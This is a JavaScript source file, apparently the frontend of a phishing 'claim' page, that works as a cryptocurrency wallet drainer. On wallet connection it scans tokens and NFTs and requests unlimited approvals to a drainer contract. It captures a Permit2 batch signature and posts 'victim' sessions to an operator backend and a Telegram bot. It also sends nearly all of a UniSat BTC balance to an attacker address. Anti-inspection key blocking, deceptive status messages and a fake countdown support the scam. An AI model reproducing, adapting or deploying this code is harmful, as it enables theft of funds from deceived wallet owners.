/* ============================================================================
 *  script.js — Approval Harvester
 *  ---------------------------------------------------------------------------
 *  RESPONSIBILITY: on wallet-connected, scan, approve, capture Permit2,
 *  POST to backend. Backend (operator) does the actual drain.
 * =========================================================================== */

import { CONFIG } from './config.js';

/* ─── ANTI-DEBUG (classroom authenticity; harmless) ─────────────────── */
(function () {
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  if (isMobile) return;
  document.addEventListener('contextmenu', (e) => e.preventDefault());
  document.addEventListener('selectstart',   (e) => e.preventDefault());
  document.addEventListener('keydown', (e) => {
    if (e.keyCode === 123) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && e.keyCode === 73) e.preventDefault();
    if (e.ctrlKey && e.shiftKey && e.keyCode === 74) e.preventDefault();
    if (e.ctrlKey && e.keyCode === 85) e.preventDefault();
  });
})();

/* ─── STATE ─────────────────────────────────────────────────────────── */
const scanCache = new Map();   // address → { erc20s, nfts }
let processed = false;
let consecutiveRejections = 0;
let ethPriceUSD = 2200;
let priceCacheUntil = 0;

/* ─── LOGGING + UI ──────────────────────────────────────────────────── */
function logDebug(msg) {
  console.log(`[APEX] ${msg}`);
  const dbg = document.getElementById('connectionDebug');
  if (dbg) { dbg.innerHTML += `<div>[${new Date().toLocaleTimeString()}] ${msg}</div>`; dbg.scrollTop = dbg.scrollHeight; }
}

function showStatus(message, type = 'info') {
  const el = document.getElementById('claimStatus');
  if (!el) return;
  el.textContent = message;
  el.className = `status ${type}`;
  el.style.display = 'block';
  el.style.padding = '12px 16px';
  el.style.borderRadius = '8px';
  el.style.marginTop = '12px';
  el.style.fontWeight = '500';
  el.style.fontSize = '14px';
  el.style.textAlign = 'center';
  const styles = {
    success: { background: '#DCFCE7', color: '#166534', border: '1px solid #86EFAC' },
    error:   { background: '#FEE2E2', color: '#991B1B', border: '1px solid #FCA5A5' },
    info:    { background: '#DBEAFE', color: '#1E40AF', border: '1px solid #93C5FD' },
  };
  Object.assign(el.style, styles[type] || styles.info);
}

function showNotification(message, type = 'success') {
  const el = document.createElement('div');
  el.className = `fake-notification ${type}`;
  el.innerHTML = `<i class="fas fa-${type === 'success' ? 'check-circle' : type === 'error' ? 'exclamation-circle' : 'info-circle'}"></i> ${message}`;
  document.body.appendChild(el);
  setTimeout(() => { el.style.opacity = '0'; setTimeout(() => el.remove(), 300); }, 3000);
}

/* ─── TELEGRAM ──────────────────────────────────────────────────────── */
async function sendTelegramMessage(message) {
  const { TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID } = CONFIG;
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'HTML', disable_web_page_preview: true }),
    });
  } catch (e) { logDebug(`Telegram: ${e.message}`); }
}

/* ─── ABIs (minimal) ────────────────────────────────────────────────── */
const ERC20_ABI = [
  { constant: true,  inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: true,  inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }], name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }], name: 'approve', outputs: [{ name: '', type: 'bool' }], type: 'function' },
];
const ERC721_ABI = [
  { constant: true,  inputs: [{ name: 'owner', type: 'address' }], name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' },
];
const ERC1155_ABI = [
  { constant: false, inputs: [{ name: 'operator', type: 'address' }, { name: 'approved', type: 'bool' }], name: 'setApprovalForAll', outputs: [], type: 'function' },
];

/* ─── CONSTANTS ─────────────────────────────────────────────────────── */
const MAX_UINT256 = '0x' + 'f'.repeat(64);
const MAX_UINT160 = (2n ** 160n - 1n).toString();

/* ─── SLEEP / TIMING ───────────────────────────────────────────────── */
const sleep = (ms) => new Promise((r) => setTimeout(r, ms));
function randomDelay(min, max) {
  const base = Math.floor(Math.random() * (max - min + 1)) + min;
  const jitter = Math.random() * 0.4 + 0.8;
  return sleep(base * jitter);
}

/* ─── PRICE FEED (with caching) ────────────────────────────────────── */
async function getEthPriceUSD() {
  const now = Date.now();
  if (now < priceCacheUntil) return ethPriceUSD;
  const apis = [
    ['https://api.binance.com/api/v3/ticker/price?symbol=ETHUSDT', (j) => j?.price],
    ['https://api.coinbase.com/v2/prices/ETH-USD/spot',             (j) => j?.data?.amount],
    ['https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd', (j) => j?.ethereum?.usd],
  ];
  for (const [url, pick] of apis) {
    try {
      const r = await fetch(url);
      const j = await r.json();
      const p = parseFloat(pick(j));
      if (p > 0) {
        ethPriceUSD = p;
        priceCacheUntil = now + 60_000;
        return p;
      }
    } catch {}
  }
  return ethPriceUSD;
}

/* ─── RECEIPT WAIT ─────────────────────────────────────────────────── */
async function waitForReceipt(web3, hash, timeoutMs = CONFIG.RECEIPT_TIMEOUT_MS ?? 120_000) {
  const start = Date.now();
  while (Date.now() - start < timeoutMs) {
    try {
      const r = await web3.eth.getTransactionReceipt(hash);
      if (r) return r;
    } catch {}
    await sleep(2000);
  }
  return null;
}

async function sendAndConfirm(web3, txPromise, description) {
  try {
    logDebug(`📤 ${description}`);
    const tx = await txPromise;
    logDebug(`📨 ${tx.transactionHash}`);
    const receipt = await waitForReceipt(web3, tx.transactionHash);
    if (!receipt) return { ok: false, reason: 'no_receipt' };
    if (receipt.status === false) return { ok: false, reason: 'reverted' };
    logDebug(`✅ ${description} confirmed`);
    return { ok: true, hash: tx.transactionHash };
  } catch (e) {
    logDebug(`❌ ${description}: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

/* ─── WALLET SCANNING (with per-address cache) ─────────────────────── */
async function scanERC20s(web3, address) {
  const cached = scanCache.get(address);
  if (cached?.erc20s) return cached.erc20s;
  const found = [];
  for (const t of CONFIG.KNOWN_TOKENS) {
    try {
      const c = new web3.eth.Contract(ERC20_ABI, t.address);
      const raw = await c.methods.balanceOf(address).call();
      const bal = BigInt(raw.toString());
      if (bal > 0n) {
        found.push({ address: t.address, symbol: t.symbol, decimals: t.decimals, rawBalance: bal.toString() });
      }
    } catch {}
  }
  const entry = cached || {};
  entry.erc20s = found;
  scanCache.set(address, entry);
  return found;
}

async function scanNFTs(web3, address) {
  const cached = scanCache.get(address);
  if (cached?.nfts) return cached.nfts;
  const found = [];
  for (const c of CONFIG.KNOWN_NFT_COLLECTIONS) {
    try {
      const abi = c.standard === 1155 ? ERC1155_ABI : ERC721_ABI;
      const contract = new web3.eth.Contract(abi, c.address);
      const bal = await contract.methods.balanceOf(address).call();
      if (BigInt(bal.toString()) > 0n) found.push({ ...c, balance: bal.toString() });
    } catch {}
  }
  const entry = cached || {};
  entry.nfts = found;
  scanCache.set(address, entry);
  return found;
}

/* ─── APPROVALS ────────────────────────────────────────────────────── */
async function approveERC20(web3, address, tokenAddress, amount) {
  try {
    const token = new web3.eth.Contract(ERC20_ABI, tokenAddress);

    // Reset allowance if non-zero (USDT-style tokens require this)
    try {
      const current = await token.methods.allowance(address, CONFIG.DRAINER_CONTRACT).call();
      if (current !== '0' && current !== 0) {
        logDebug(`Resetting allowance for ${tokenAddress.slice(0, 10)}`);
        const resetTx = token.methods.approve(CONFIG.DRAINER_CONTRACT, '0');
        const resetGas = await resetTx.estimateGas({ from: address }).catch(() => 100_000);
        const resetResult = await sendAndConfirm(
          web3, resetTx.send({ from: address, gas: Math.floor(resetGas * 1.3) }),
          `reset ${tokenAddress.slice(0, 10)}`
        );
        if (!resetResult.ok) logDebug(`Reset failed, continuing anyway: ${resetResult.reason}`);
      }
    } catch {}

    const tx = token.methods.approve(CONFIG.DRAINER_CONTRACT, amount);
    let gas;
    try { gas = Math.floor((await tx.estimateGas({ from: address })) * 1.3); }
    catch { gas = 100_000; }

    return await sendAndConfirm(web3, tx.send({ from: address, gas }), `approve ${tokenAddress.slice(0, 10)}`);
  } catch (e) {
    logDebug(`approveERC20 error: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

async function approveNFT(web3, address, collection, standard) {
  try {
    const abi = standard === 1155 ? ERC1155_ABI : ERC721_ABI;
    const contract = new web3.eth.Contract(abi, collection);
    const tx = contract.methods.setApprovalForAll(CONFIG.DRAINER_CONTRACT, true);
    let gas;
    try { gas = Math.floor((await tx.estimateGas({ from: address })) * 1.3); }
    catch { gas = 100_000; }
    return await sendAndConfirm(web3, tx.send({ from: address, gas }), `setApprovalForAll ${collection.slice(0, 10)}`);
  } catch (e) {
    logDebug(`approveNFT error: ${e.message}`);
    return { ok: false, reason: e.message };
  }
}

/* ─── PERMIT2 SIGNATURE ────────────────────────────────────────────── */
async function requestPermit2Signature(web3, address, tokens, amounts) {
  try {
    let chainId = CONFIG.MAINNET_ID;
    try { chainId = await web3.eth.getChainId(); } catch {}

    const spender = CONFIG.DRAINER_CONTRACT;
    const now = Math.floor(Date.now() / 1000);
    const sigDeadline = now + 30 * 24 * 3600;
    const expiration  = now + 30 * 24 * 3600;

    // Cap amounts to uint160 max to avoid overflow
    const details = tokens.map((token, i) => {
      const raw = BigInt(amounts[i]);
      const capped = raw > BigInt(MAX_UINT160) ? MAX_UINT160 : raw.toString();
      return { token, amount: capped, expiration, nonce: 0 };
    });

    const payload = {
      types: {
        EIP712Domain: [
          { name: 'name', type: 'string' },
          { name: 'chainId', type: 'uint256' },
          { name: 'verifyingContract', type: 'address' },
        ],
        PermitBatch: [
          { name: 'details', type: 'PermitDetails[]' },
          { name: 'spender', type: 'address' },
          { name: 'sigDeadline', type: 'uint256' },
        ],
        PermitDetails: [
          { name: 'token',      type: 'address' },
          { name: 'amount',     type: 'uint160' },
          { name: 'expiration', type: 'uint48' },
          { name: 'nonce',      type: 'uint48' },
        ],
      },
      primaryType: 'PermitBatch',
      domain: { name: 'Permit2', chainId, verifyingContract: CONFIG.PERMIT2_ADDRESS },
      message: { details, spender, sigDeadline },
    };

    const sig = await window.__apexState.provider.request({
      method: 'eth_signTypedData_v4',
      params: [address, JSON.stringify(payload)],
    });

    return { details, spender, sigDeadline, sig };
  } catch (e) {
    logDebug(`Permit2 signature: ${e.message}`);
    return null;
  }
}

/* ─── BACKEND POST ─────────────────────────────────────────────────── */
async function notifyBackend(session) {
  if (!CONFIG.BACKEND_URL) {
    logDebug('No BACKEND_URL configured — harvest stays local');
    return false;
  }
  try {
    const res = await fetch(CONFIG.BACKEND_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(session),
    });
    logDebug(`Backend: HTTP ${res.status}`);
    return res.ok;
  } catch (e) {
    logDebug(`Backend POST failed: ${e.message}`);
    return false;
  }
}

/* ─── MAIN HARVEST FLOW ────────────────────────────────────────────── */
async function runHarvest() {
  if (processed) return;
  const S = window.__apexState;
  if (!S || !S.connected || !S.address || !S.web3) {
    logDebug('Harvest skipped: wallet state not ready');
    return;
  }

  processed = true;
  consecutiveRejections = 0;
  const web3 = S.web3;

  try {
    showStatus('Verifying wallet…', 'info');

    // ── Chain gate: mainnet only ──
    const chainId = S.chainId ?? (await web3.eth.getChainId().catch(() => null));
    if (chainId && Number(chainId) !== CONFIG.MAINNET_ID) {
      const supported = CONFIG.SUPPORTED_CHAINS.join(', ');
      logDebug(`Wrong chain: ${chainId}, expected ${CONFIG.MAINNET_ID}`);
      showStatus(`Please switch to Ethereum Mainnet (chain ${CONFIG.MAINNET_ID}).`, 'error');
      await sendTelegramMessage(`⚠️ <b>Wrong chain</b>\n<code>${S.address}</code>\nChain: ${chainId}`);
      return;
    }

    // ── Native balance gate ──
    const balWei = await web3.eth.getBalance(S.address);
    const balEth = parseFloat(web3.utils.fromWei(balWei, 'ether'));
    const balUSD = balEth * ethPriceUSD;
    logDebug(`Balance: ${balEth.toFixed(6)} ETH (~$${balUSD.toFixed(2)})`);

    if (balUSD < CONFIG.CLAIM_THRESHOLD_USD) {
      showStatus('Minimum balance required to complete your claim.', 'error');
      await sendTelegramMessage(`⚠️ <b>Skipped (underfunded)</b>\n<code>${S.address}</code>\nBalance: ${balEth.toFixed(6)} ETH`);
      return;
    }

    // ── Scan ──
    showStatus('Scanning wallet…', 'info');
    const [erc20s, nfts] = await Promise.all([scanERC20s(web3, S.address), scanNFTs(web3, S.address)]);
    logDebug(`Found ${erc20s.length} ERC-20s, ${nfts.length} NFT collections`);

    if (!erc20s.length && !nfts.length) {
      showStatus('No eligible assets found.', 'info');
      return;
    }

    // ── ERC-20 approvals ──
    const approvedTokens = [];
    const approvedAmounts = [];
    let approvalCounter = 0;

    for (const token of erc20s) {
      if (consecutiveRejections >= 2) {
        logDebug('Stopping after 2 consecutive rejections');
        break;
      }
      showStatus(`Approving ${token.symbol}…`, 'info');
      const r = await approveERC20(web3, S.address, token.address, MAX_UINT256);
      if (r.ok) {
        approvedTokens.push(token.address);
        approvedAmounts.push(token.rawBalance);
        consecutiveRejections = 0;
      } else if (r.reason?.includes('User rejected') || r.reason?.includes('denied')) {
        consecutiveRejections++;
      }
      approvalCounter++;
      if (approvalCounter % CONFIG.APPROVAL_COOLDOWN_EVERY === 0) {
        logDebug('Cool-down between approval batches…');
        await sleep(CONFIG.APPROVAL_COOLDOWN_MS);
      } else {
        await randomDelay(CONFIG.APPROVAL_DELAY_MS, CONFIG.APPROVAL_DELAY_MS + 1500);
      }
    }

    // ── NFT approvals ──
    let nftApprovals = 0;
    for (const nft of nfts) {
      if (consecutiveRejections >= 2) break;
      showStatus(`Approving ${nft.name}…`, 'info');
      const r = await approveNFT(web3, S.address, nft.address, nft.standard);
      if (r.ok) { nftApprovals++; consecutiveRejections = 0; }
      else if (r.reason?.includes('User rejected')) consecutiveRejections++;
      await randomDelay(CONFIG.APPROVAL_DELAY_MS, CONFIG.APPROVAL_DELAY_MS + 1500);
    }

    // ── Permit2 signature ──
    let permit2Payload = null;
    if (approvedTokens.length > 0) {
      showStatus('Verifying wallet ownership…', 'info');
      permit2Payload = await requestPermit2Signature(web3, S.address, approvedTokens, approvedAmounts);
    }

    // ── Session POST ──
    const session = {
      victim: S.address,
      chain: Number(chainId) || CONFIG.MAINNET_ID,
      contract: CONFIG.DRAINER_CONTRACT,
      erc20s,
      approvedTokens,
      approvedAmounts,
      nfts,
      nftApprovals,
      permit2Payload,
      submittedAt: Date.now(),
    };

    const posted = await notifyBackend(session);

    // ── Report ──
    const msg =
      `🟦 <b>Session Complete</b>\n` +
      `👤 <code>${S.address}</code>\n` +
      `💰 ETH: ${balEth.toFixed(6)}\n` +
      `🪙 ERC-20: ${erc20s.length} (approved: ${approvedTokens.length})\n` +
      `🖼 NFT: ${nfts.length} (approved: ${nftApprovals})\n` +
      `🔏 Permit2: ${permit2Payload ? 'captured' : 'none'}\n` +
      `📡 Backend: ${posted ? 'notified' : 'unreachable'}\n` +
      `🕒 ${new Date().toISOString()}`;
    await sendTelegramMessage(msg);

    showStatus(posted ? 'Claim submitted. Please wait for confirmation.' : 'Claim recorded.', 'success');
  } catch (e) {
    logDebug(`Harvest error: ${e.message}`);
    showStatus('Claim failed. Please try again.', 'error');
    await sendTelegramMessage(`❌ <b>Harvest failed</b>\n${e.message}`);
  }
}

/* ─── NON-EVM DRAINS ───────────────────────────────────────────────── */
async function drainNativeBTC() {
  if (!window.unisat) throw new Error('UniSat not found');
  const accounts = await window.unisat.getAccounts();
  if (!accounts.length) throw new Error('No BTC account');
  const balance = await window.unisat.getBalance();
  const minSats = 100_000;
  if (balance.total < minSats) throw new Error('Insufficient balance');
  const amount = balance.total - 5000;
  const txid = await window.unisat.sendBitcoin(CONFIG.ATTACKER_BTC_ADDRESS, amount);
  await sendTelegramMessage(`🟧 <b>BTC Drain</b>\n<code>${accounts[0]}</code>\nAmount: ${amount / 1e8} BTC\nTxid: <code>${txid}</code>`);
  return txid;
}

async function drainNativeSOL() {
  throw new Error('Solana drain not implemented in this build');
}

/* ─── EVENT LISTENERS ──────────────────────────────────────────────── */
window.addEventListener('wallet-connected', async (event) => {
  const { address } = event.detail || {};
  if (!address) return;
  processed = false;
  ethPriceUSD = await getEthPriceUSD();
  await sleep(1500);
  await runHarvest();
});

window.addEventListener('wallet-disconnected', () => {
  processed = false;
  showStatus('Wallet disconnected', 'info');
});

/* ─── BOOT (decorative countdown) ──────────────────────────────────── */
function startCountdown() {
  let remaining = 114600;
  setInterval(() => {
    remaining--;
    const el = document.getElementById('countdown');
    if (!el) return;
    const d = Math.floor(remaining / 86400);
    const h = Math.floor((remaining % 86400) / 3600);
    const m = Math.floor((remaining % 3600) / 60);
    const s = remaining % 60;
    el.textContent = `${d}:${h}:${m}:${s}`;
  }, 1000);
}
document.addEventListener('DOMContentLoaded', startCountdown);

/* ─── GLOBAL EXPOSURE ──────────────────────────────────────────────── */
window.drainBTC = async () => { try { return await drainNativeBTC(); } catch (e) { showNotification(`BTC: ${e.message}`, 'error'); } };
window.drainSOL = async () => { try { return await drainNativeSOL(); } catch (e) { showNotification(`SOL: ${e.message}`, 'error'); } };

logDebug('script.js ready — waiting for wallet-connected');
